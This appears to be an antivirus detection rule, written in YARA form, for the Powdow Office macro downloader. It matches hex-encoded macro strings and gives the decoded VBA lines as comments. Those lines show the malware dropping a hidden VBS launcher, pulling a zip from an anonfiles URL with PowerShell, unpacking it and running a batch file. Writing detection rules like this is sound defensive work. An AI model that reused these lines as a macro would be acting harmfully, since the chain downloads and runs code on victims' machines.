
rule TrojanDownloader_O97M_Powdow_STT_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.STT!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 01 00 "
		
	strings :
		$a_01_0 = {53 65 74 20 61 20 3d 20 66 73 2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 22 43 3a 5c 55 73 65 72 73 5c 22 20 26 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 55 73 65 72 4e 61 6d 65 20 26 20 22 5c 44 6f 63 75 6d 65 6e 74 73 5c 69 6e 76 2e 76 62 73 22 2c 20 54 72 75 65 29 } //01 00  Set a = fs.CreateTextFile("C:\Users\" & Application.UserName & "\Documents\inv.vbs", True)
		$a_01_1 = {61 2e 57 72 69 74 65 4c 69 6e 65 20 28 22 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 20 26 20 43 68 72 28 33 34 29 20 26 20 22 57 73 63 72 69 70 74 2e 53 68 65 6c 6c 22 20 26 20 43 68 72 28 33 34 29 20 26 20 22 29 2e 52 75 6e 20 22 20 26 20 43 68 72 28 33 34 29 20 26 20 43 68 72 28 33 34 29 20 26 20 43 68 72 28 33 34 29 20 26 20 43 68 72 28 33 34 29 20 26 20 22 20 26 20 57 53 63 72 69 70 74 2e 41 72 67 75 6d 65 6e 74 73 28 30 29 20 26 20 22 20 26 20 43 68 72 28 33 34 29 20 26 20 43 68 72 28 33 34 29 20 26 20 43 68 72 28 33 34 29 20 26 20 43 68 72 28 33 34 29 20 26 20 22 2c 20 30 2c 20 46 61 6c 73 65 22 29 } //01 00  a.WriteLine ("CreateObject(" & Chr(34) & "Wscript.Shell" & Chr(34) & ").Run " & Chr(34) & Chr(34) & Chr(34) & Chr(34) & " & WScript.Arguments(0) & " & Chr(34) & Chr(34) & Chr(34) & Chr(34) & ", 0, False")
		$a_01_2 = {62 2e 57 72 69 74 65 4c 69 6e 65 20 28 22 63 64 20 43 3a 5c 53 79 73 33 32 20 26 26 20 70 6f 77 65 72 73 68 65 6c 6c 20 2d 63 6f 6d 6d 61 6e 64 20 22 20 26 20 43 68 72 28 33 34 29 20 26 20 22 49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 2d 55 72 69 20 27 68 74 74 70 73 3a 2f 2f 63 64 6e 2d 31 33 31 2e 61 6e 6f 6e 66 69 6c 65 73 2e 63 6f 6d 2f 6a 62 4e 33 70 39 54 66 79 34 2f 30 62 61 37 35 32 66 65 2d 31 36 37 34 33 39 37 34 34 34 2f 48 55 4c 44 36 61 68 75 35 39 51 52 34 50 48 42 2e 7a 69 70 27 20 2d 4f 75 74 46 69 6c 65 20 75 6e 74 69 74 6c 65 64 2e 7a 69 70 22 20 26 20 43 68 72 28 33 34 29 29 } //01 00  b.WriteLine ("cd C:\Sys32 && powershell -command " & Chr(34) & "Invoke-WebRequest -Uri 'https://cdn-131.anonfiles.com/jbN3p9Tfy4/0ba752fe-1674397444/HULD6ahu59QR4PHB.zip' -OutFile untitled.zip" & Chr(34))
		$a_01_3 = {62 2e 57 72 69 74 65 4c 69 6e 65 20 28 22 70 6f 77 65 72 73 68 65 6c 6c 20 2d 63 6f 6d 6d 61 6e 64 20 22 20 26 20 43 68 72 28 33 34 29 20 26 20 22 65 78 70 61 6e 64 2d 61 72 63 68 69 76 65 20 2d 70 61 74 68 20 27 75 6e 74 69 74 6c 65 64 2e 7a 69 70 27 22 29 } //01 00  b.WriteLine ("powershell -command " & Chr(34) & "expand-archive -path 'untitled.zip'")
		$a_01_4 = {62 2e 57 72 69 74 65 4c 69 6e 65 20 28 22 77 73 63 72 69 70 74 20 22 20 26 20 43 68 72 28 33 34 29 20 26 20 22 43 3a 5c 53 79 73 33 32 5c 69 6e 76 2e 76 62 73 22 20 26 20 43 68 72 28 33 34 29 20 26 20 22 20 43 3a 5c 53 79 73 33 32 5c 75 6e 74 69 74 6c 65 64 5c 55 6e 74 69 74 6c 65 64 2e 62 61 74 22 29 } //00 00  b.WriteLine ("wscript " & Chr(34) & "C:\Sys32\inv.vbs" & Chr(34) & " C:\Sys32\untitled\Untitled.bat")
	condition:
		any of ($a_*)
 
}